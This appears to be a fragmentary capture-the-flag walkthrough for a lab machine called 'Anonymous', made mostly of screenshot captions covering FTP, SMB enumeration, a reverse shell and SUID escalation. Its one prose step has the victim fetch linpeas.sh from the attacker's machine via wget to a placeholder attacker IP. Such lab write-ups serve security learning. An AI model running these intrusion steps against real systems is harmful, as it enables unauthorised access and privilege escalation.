...
![Anonymous nmap](/images/Anonymous1.png)
...
![Anonymous ftp connect](/images/Anonymous2.png)
...
![Anonymous ftp scripts directory](/images/Anonymous3.png)
...
![Anonymous cat clean.sh](/images/Anonymous4.png)
...
![Anonymous cat removed_files.log](/images/Anonymous5.png)
...
![Anonymous cat to_do.txt](/images/Anonymous6.png)
...
![Anonymous list smb shares smbclient](/images/Anonymous7.png)
...
![Anonymous smbclient anonymous](/images/Anonymous8.png)
...
![Anonymous rpcclient](/images/Anonymous9.png)
...
![Anonymous modify clean.sh](/images/Anonymous10.png)
...
![Anonymous reverse shell](/images/Anonymous13.png)
...
![Anonymous user.txt](/images/Anonymous14.png)
...
First, on our attacker pc, run `python3 -m http.server` in the directory that linpeas.sh is in. Next, on the victim, run `wget http://[attacker ip]:8000/linpeas.sh`, and it should save in namelessone's home directory. Next, run `chmod 777 linpeas.sh` to make the script executable.

![Anonymous wget linpeas.sh](/images/Anonymous15.png)
...
![Anonymous SUID](/images/Anonymous16.png)
...
![Anonymous root.txt](/images/Anonymous17.png)
